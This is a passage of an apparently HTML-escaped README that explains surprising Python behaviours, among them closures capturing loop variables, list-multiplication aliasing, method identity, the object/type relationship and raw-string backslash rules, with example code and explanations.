destroyed).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;In the second case, the slice assignment to &lt;code&gt;array_2&lt;/code&gt; updates the same old object &lt;code&gt;[1,2,3,4]&lt;/code&gt; to &lt;code&gt;[1,2,3,4,5]&lt;/code&gt;. Hence both the &lt;code&gt;g2&lt;/code&gt; and &lt;code&gt;array_2&lt;/code&gt; still have reference to the same object (which has now been updated to &lt;code&gt;[1,2,3,4,5]&lt;/code&gt;).&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Okay, going by the logic discussed so far, shouldn&#39;t be the value of &lt;code&gt;list(gen)&lt;/code&gt; in the third snippet be &lt;code&gt;[11, 21, 31, 12, 22, 32, 13, 23, 33]&lt;/code&gt;? (because &lt;code&gt;array_3&lt;/code&gt; and &lt;code&gt;array_4&lt;/code&gt; are going to behave just like &lt;code&gt;array_1&lt;/code&gt;). The reason why (only) &lt;code&gt;array_4&lt;/code&gt; values got updated is explained in &lt;a href=&#34;https://www.python.org/dev/peps/pep-0289/#the-details&#34;&gt;PEP-289&lt;/a&gt;&lt;/p&gt; &#xA;  &lt;blockquote&gt; &#xA;   &lt;p&gt;Only the outermost for-expression is evaluated immediately, the other expressions are deferred until the generator is run.&lt;/p&gt; &#xA;  &lt;/blockquote&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ &lt;code&gt;is not ...&lt;/code&gt; is not &lt;code&gt;is (not ...)&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;!-- Example ID: b26fb1ed-0c7d-4b9c-8c6d-94a58a055c0d ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#39;something&#39; is not None&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; &#39;something&#39; is (not None)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;is not&lt;/code&gt; is a single binary operator, and has behavior different than using &lt;code&gt;is&lt;/code&gt; and &lt;code&gt;not&lt;/code&gt; separated.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;is not&lt;/code&gt; evaluates to &lt;code&gt;False&lt;/code&gt; if the variables on either side of the operator point to the same object and &lt;code&gt;True&lt;/code&gt; otherwise.&lt;/li&gt; &#xA; &lt;li&gt;In the example, &lt;code&gt;(not None)&lt;/code&gt; evaluates to &lt;code&gt;True&lt;/code&gt; since the value &lt;code&gt;None&lt;/code&gt; is &lt;code&gt;False&lt;/code&gt; in a boolean context, so the expression becomes &lt;code&gt;&#39;something&#39; is True&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ A tic-tac-toe where X wins in the first attempt!&lt;/h3&gt; &#xA;&lt;!-- Example ID: 69329249-bdcb-424f-bd09-cca2e6705a7a ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;# Let&#39;s initialize a row&#xA;row = [&#34;&#34;] * 3 #row i[&#39;&#39;, &#39;&#39;, &#39;&#39;]&#xA;# Let&#39;s make a board&#xA;board = [row] * 3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0]&#xA;[&#39;&#39;, &#39;&#39;, &#39;&#39;]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0]&#xA;&#39;&#39;&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0] = &#34;X&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;X&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We didn&#39;t assign three &lt;code&gt;&#34;X&#34;&lt;/code&gt;s, did we?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;p&gt;When we initialize &lt;code&gt;row&lt;/code&gt; variable, this visualization explains what happens in the memory&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/tic-tac-toe/after_row_initialized.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;And when the &lt;code&gt;board&lt;/code&gt; is initialized by multiplying the &lt;code&gt;row&lt;/code&gt;, this is what happens inside the memory (each of the elements &lt;code&gt;board[0]&lt;/code&gt;, &lt;code&gt;board[1]&lt;/code&gt; and &lt;code&gt;board[2]&lt;/code&gt; is a reference to the same list referred by &lt;code&gt;row&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/satwikkansal/wtfpython/master/images/tic-tac-toe/after_board_initialized.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;We can avoid this scenario here by not using &lt;code&gt;row&lt;/code&gt; variable to generate &lt;code&gt;board&lt;/code&gt;. (Asked in &lt;a href=&#34;https://github.com/satwikkansal/wtfpython/issues/68&#34;&gt;this&lt;/a&gt; issue).&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; board = [[&#39;&#39;]*3 for _ in range(3)]&#xA;&amp;gt;&amp;gt;&amp;gt; board[0][0] = &#34;X&#34;&#xA;&amp;gt;&amp;gt;&amp;gt; board&#xA;[[&#39;X&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;], [&#39;&#39;, &#39;&#39;, &#39;&#39;]]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Schrödinger&#39;s variable *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 4dc42f77-94cb-4eb5-a120-8203d3ed7604 ---&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;funcs = []&#xA;results = []&#xA;for x in range(7):&#xA;    def some_func():&#xA;        return x&#xA;    funcs.append(some_func)&#xA;    results.append(some_func())  # note the function call here&#xA;&#xA;funcs_results = [func() for func in funcs]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (Python version):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; results&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&amp;gt;&amp;gt;&amp;gt; funcs_results&#xA;[6, 6, 6, 6, 6, 6, 6]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The values of &lt;code&gt;x&lt;/code&gt; were different in every iteration prior to appending &lt;code&gt;some_func&lt;/code&gt; to &lt;code&gt;funcs&lt;/code&gt;, but all the functions return 6 when they&#39;re evaluated after the loop completes.&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; powers_of_x = [lambda x: x**i for i in range(10)]&#xA;&amp;gt;&amp;gt;&amp;gt; [f(2) for f in powers_of_x]&#xA;[512, 512, 512, 512, 512, 512, 512, 512, 512, 512]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;When defining a function inside a loop that uses the loop variable in its body, the loop function&#39;s closure is bound to the &lt;em&gt;variable&lt;/em&gt;, not its &lt;em&gt;value&lt;/em&gt;. The function looks up &lt;code&gt;x&lt;/code&gt; in the surrounding context, rather than using the value of &lt;code&gt;x&lt;/code&gt; at the time the function is created. So all of the functions use the latest value assigned to the variable for computation. We can see that it&#39;s using the &lt;code&gt;x&lt;/code&gt; from the surrounding context (i.e. &lt;em&gt;not&lt;/em&gt; a local variable) with:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import inspect&#xA;&amp;gt;&amp;gt;&amp;gt; inspect.getclosurevars(funcs[0])&#xA;ClosureVars(nonlocals={}, globals={&#39;x&#39;: 6}, builtins={}, unbound=set())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Since &lt;code&gt;x&lt;/code&gt; is a global value, we can change the value that the &lt;code&gt;funcs&lt;/code&gt; will lookup and return by updating &lt;code&gt;x&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; x = 42&#xA;&amp;gt;&amp;gt;&amp;gt; [func() for func in funcs]&#xA;[42, 42, 42, 42, 42, 42, 42]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;To get the desired behavior you can pass in the loop variable as a named variable to the function. &lt;strong&gt;Why does this work?&lt;/strong&gt; Because this will define the variable &lt;em&gt;inside&lt;/em&gt; the function&#39;s scope. It will no longer go to the surrounding (global) scope to look up the variables value but will create a local variable that stores the value of &lt;code&gt;x&lt;/code&gt; at that point in time.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;funcs = []&#xA;for x in range(7):&#xA;    def some_func(x=x):&#xA;        return x&#xA;    funcs.append(some_func)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; funcs_results = [func() for func in funcs]&#xA;&amp;gt;&amp;gt;&amp;gt; funcs_results&#xA;[0, 1, 2, 3, 4, 5, 6]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It is not longer using the &lt;code&gt;x&lt;/code&gt; in the global scope:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; inspect.getclosurevars(funcs[0])&#xA;ClosureVars(nonlocals={}, globals={}, builtins={}, unbound=set())&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The chicken-egg problem *&lt;/h3&gt; &#xA;&lt;!-- Example ID: 60730dc2-0d79-4416-8568-2a63323b3ce8 ---&gt; &#xA;&lt;p&gt;1.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; isinstance(3, int)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(type, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(object, type)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So which is the &#34;ultimate&#34; base class? There&#39;s more to the confusion by the way,&lt;/p&gt; &#xA;&lt;p&gt;2.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; class A: pass&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(A, A)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(type, type)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; isinstance(object, object)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;3.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; issubclass(int, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(type, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(object, type)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;type&lt;/code&gt; is a &lt;a href=&#34;https://realpython.com/python-metaclasses/&#34;&gt;metaclass&lt;/a&gt; in Python.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Everything&lt;/strong&gt; is an &lt;code&gt;object&lt;/code&gt; in Python, which includes classes as well as their objects (instances).&lt;/li&gt; &#xA; &lt;li&gt;class &lt;code&gt;type&lt;/code&gt; is the metaclass of class &lt;code&gt;object&lt;/code&gt;, and every class (including &lt;code&gt;type&lt;/code&gt;) has inherited directly or indirectly from &lt;code&gt;object&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;There is no real base class among &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt;. The confusion in the above snippets is arising because we&#39;re thinking about these relationships (&lt;code&gt;issubclass&lt;/code&gt; and &lt;code&gt;isinstance&lt;/code&gt;) in terms of Python classes. The relationship between &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; can&#39;t be reproduced in pure python. To be more precise the following relationships can&#39;t be reproduced in pure Python, &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;class A is an instance of class B, and class B is an instance of class A.&lt;/li&gt; &#xA;   &lt;li&gt;class A is an instance of itself.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;These relationships between &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;type&lt;/code&gt; (both being instances of each other as well as themselves) exist in Python because of &#34;cheating&#34; at the implementation level.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Subclass relationships&lt;/h3&gt; &#xA;&lt;!-- Example ID: 9f6d8cf0-e1b5-42d0-84a0-4cfab25a0bc0 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from collections import Hashable&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(list, object)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(object, Hashable)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; issubclass(list, Hashable)&#xA;False&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Subclass relationships were expected to be transitive, right? (i.e., if &lt;code&gt;A&lt;/code&gt; is a subclass of &lt;code&gt;B&lt;/code&gt;, and &lt;code&gt;B&lt;/code&gt; is a subclass of &lt;code&gt;C&lt;/code&gt;, the &lt;code&gt;A&lt;/code&gt; &lt;em&gt;should&lt;/em&gt; a subclass of &lt;code&gt;C&lt;/code&gt;)&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Subclass relationships are not necessarily transitive in Python. Anyone is allowed to define their own, arbitrary &lt;code&gt;__subclasscheck__&lt;/code&gt; in a metaclass.&lt;/li&gt; &#xA; &lt;li&gt;When &lt;code&gt;issubclass(cls, Hashable)&lt;/code&gt; is called, it simply looks for non-Falsey &#34;&lt;code&gt;__hash__&lt;/code&gt;&#34; method in &lt;code&gt;cls&lt;/code&gt; or anything it inherits from.&lt;/li&gt; &#xA; &lt;li&gt;Since &lt;code&gt;object&lt;/code&gt; is hashable, but &lt;code&gt;list&lt;/code&gt; is non-hashable, it breaks the transitivity relation.&lt;/li&gt; &#xA; &lt;li&gt;More detailed explanation can be found &lt;a href=&#34;https://www.naftaliharris.com/blog/python-subclass-intransitivity/&#34;&gt;here&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Methods equality and identity&lt;/h3&gt; &#xA;&lt;!-- Example ID: 94802911-48fe-4242-defa-728ae893fa32 ---&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;class SomeClass:&#xA;    def method(self):&#xA;        pass&#xA;&#xA;    @classmethod&#xA;    def classm(cls):&#xA;        pass&#xA;&#xA;    @staticmethod&#xA;    def staticm():&#xA;        pass&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.method is SomeClass.method)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.classm is SomeClass.classm)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.classm == SomeClass.classm)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(SomeClass.staticm is SomeClass.staticm)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Accessing &lt;code&gt;classm&lt;/code&gt; twice, we get an equal object, but not the &lt;em&gt;same&lt;/em&gt; one? Let&#39;s see what happens with instances of &lt;code&gt;SomeClass&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;o1 = SomeClass()&#xA;o2 = SomeClass()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(o1.method == o2.method)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.method == o1.method)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.method is o1.method)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.classm is o1.classm)&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.classm == o1.classm == o2.classm == SomeClass.classm)&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(o1.staticm is o1.staticm is o2.staticm is SomeClass.staticm)&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Accessing&lt;code&gt; classm&lt;/code&gt; or &lt;code&gt;method&lt;/code&gt; twice, creates equal but not &lt;em&gt;same&lt;/em&gt; objects for the same instance of &lt;code&gt;SomeClass&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Functions are &lt;a href=&#34;https://docs.python.org/3/howto/descriptor.html&#34;&gt;descriptors&lt;/a&gt;. Whenever a function is accessed as an attribute, the descriptor is invoked, creating a method object which &#34;binds&#34; the function with the object owning the attribute. If called, the method calls the function, implicitly passing the bound object as the first argument (this is how we get &lt;code&gt;self&lt;/code&gt; as the first argument, despite not passing it explicitly).&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.method&#xA;&amp;lt;bound method SomeClass.method of &amp;lt;__main__.SomeClass object at ...&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Accessing the attribute multiple times creates a method object every time! Therefore &lt;code&gt;o1.method is o1.method&lt;/code&gt; is never truthy. Accessing functions as class attributes (as opposed to instance) does not create methods, however; so &lt;code&gt;SomeClass.method is SomeClass.method&lt;/code&gt; is truthy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.method&#xA;&amp;lt;function SomeClass.method at ...&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;classmethod&lt;/code&gt; transforms functions into class methods. Class methods are descriptors that, when accessed, create a method object which binds the &lt;em&gt;class&lt;/em&gt; (type) of the object, instead of the object itself.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.classm&#xA;&amp;lt;bound method SomeClass.classm of &amp;lt;class &#39;__main__.SomeClass&#39;&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Unlike functions, &lt;code&gt;classmethod&lt;/code&gt;s will create a method also when accessed as class attributes (in which case they bind the class, not to the type of it). So &lt;code&gt;SomeClass.classm is SomeClass.classm&lt;/code&gt; is falsy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; SomeClass.classm&#xA;&amp;lt;bound method SomeClass.classm of &amp;lt;class &#39;__main__.SomeClass&#39;&amp;gt;&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A method object compares equal when both the functions are equal, and the bound objects are the same. So &lt;code&gt;o1.method == o1.method&lt;/code&gt; is truthy, although not the same object in memory.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;staticmethod&lt;/code&gt; transforms functions into a &#34;no-op&#34; descriptor, which returns the function as-is. No method objects are ever created, so comparison with &lt;code&gt;is&lt;/code&gt; is truthy.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; o1.staticm&#xA;&amp;lt;function SomeClass.staticm at ...&amp;gt;&#xA;&amp;gt;&amp;gt;&amp;gt; SomeClass.staticm&#xA;&amp;lt;function SomeClass.staticm at ...&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Having to create new &#34;method&#34; objects every time Python calls instance methods and having to modify the arguments every time in order to insert &lt;code&gt;self&lt;/code&gt; affected performance badly. CPython 3.7 &lt;a href=&#34;https://bugs.python.org/issue26110&#34;&gt;solved it&lt;/a&gt; by introducing new opcodes that deal with calling methods without creating the temporary method objects. This is used only when the accessed function is actually called, so the snippets here are not affected, and still generate methods :)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;▶ All-true-ation *&lt;/h3&gt; &#xA;&lt;!-- Example ID: dfe6d845-e452-48fe-a2da-0ed3869a8042 --&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; all([True, True, True])&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; all([True, True, False])&#xA;False&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; all([])&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; all([[]])&#xA;False&#xA;&amp;gt;&amp;gt;&amp;gt; all([[[]]])&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Why&#39;s this True-False alteration?&lt;/p&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;The implementation of &lt;code&gt;all&lt;/code&gt; function is equivalent to&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;def all(iterable):&#xA;    for element in iterable:&#xA;        if not element:&#xA;            return False&#xA;    return True&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([])&lt;/code&gt; returns &lt;code&gt;True&lt;/code&gt; since the iterable is empty.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([[]])&lt;/code&gt; returns &lt;code&gt;False&lt;/code&gt; because the passed array has one element, &lt;code&gt;[]&lt;/code&gt;, and in python, an empty list is falsy.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;code&gt;all([[[]]])&lt;/code&gt; and higher recursive variants are always &lt;code&gt;True&lt;/code&gt;. This is because the passed array&#39;s single element (&lt;code&gt;[[...]]&lt;/code&gt;) is no longer empty, and lists with values are truthy.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ The surprising comma&lt;/h3&gt; &#xA;&lt;!-- Example ID: 31a819c8-ed73-4dcc-84eb-91bedbb51e58 ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output (&amp;lt; 3.6):&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; def f(x, y,):&#xA;...     print(x, y)&#xA;...&#xA;&amp;gt;&amp;gt;&amp;gt; def g(x=4, y=5,):&#xA;...     print(x, y)&#xA;...&#xA;&amp;gt;&amp;gt;&amp;gt; def h(x, **kwargs,):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    def h(x, **kwargs,):&#xA;                     ^&#xA;SyntaxError: invalid syntax&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; def h(*args,):&#xA;  File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    def h(*args,):&#xA;                ^&#xA;SyntaxError: invalid syntax&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation:&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Trailing comma is not always legal in formal parameters list of a Python function.&lt;/li&gt; &#xA; &lt;li&gt;In Python, the argument list is defined partially with leading commas and partially with trailing commas. This conflict causes situations where a comma is trapped in the middle, and no rule accepts it.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Note:&lt;/strong&gt; The trailing comma problem is &lt;a href=&#34;https://bugs.python.org/issue9232&#34;&gt;fixed in Python 3.6&lt;/a&gt;. The remarks in &lt;a href=&#34;https://bugs.python.org/issue9232#msg248399&#34;&gt;this&lt;/a&gt; post discuss in brief different usages of trailing commas in Python.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;▶ Strings and the backslashes&lt;/h3&gt; &#xA;&lt;!-- Example ID: 6ae622c3-6d99-4041-9b33-507bd1a4407b ---&gt; &#xA;&lt;p&gt;&lt;strong&gt;Output:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; print(&#34;\&#34;&#34;)&#xA;&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\&#34;&#34;)&#xA;\&#34;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\&#34;)&#xA;File &#34;&amp;lt;stdin&amp;gt;&#34;, line 1&#xA;    print(r&#34;\&#34;)&#xA;              ^&#xA;SyntaxError: EOL while scanning string literal&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; r&#39;\&#39;&#39; == &#34;\\&#39;&#34;&#xA;True&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;💡 Explanation&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;In a usual python string, the backslash is used to escape characters that may have a special meaning (like single-quote, double-quote, and the backslash itself). &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; &#34;wt\&#34;f&#34;&#xA;&#39;wt&#34;f&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;In a raw string literal (as indicated by the prefix &lt;code&gt;r&lt;/code&gt;), the backslashes pass themselves as is along with the behavior of escaping the following character. &lt;pre&gt;&lt;code class=&#34;language-py&#34;&gt;&amp;gt;&amp;gt;&amp;gt; r&#39;wt\&#34;f&#39; == &#39;wt\\&#34;f&#39;&#xA;True&#xA;&amp;gt;&amp;gt;&amp;gt; print(repr(r&#39;wt\&#34;f&#39;)&#xA;&#39;wt\\&#34;f&#39;&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(&#34;\n&#34;)&#xA;&#xA;&amp;gt;&amp;gt;&amp;gt; print(r&#34;\\n&#34;)&#xA;&#39;\\n&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;This means when a parser encounters a backslash in a raw string, it expects another character following it. And in our case (&lt;code&gt;print(r&#34;\&#34;)&lt;/code&gt;), the backslash escaped the trailing quote, leaving the parser without a terminating quote (hence the 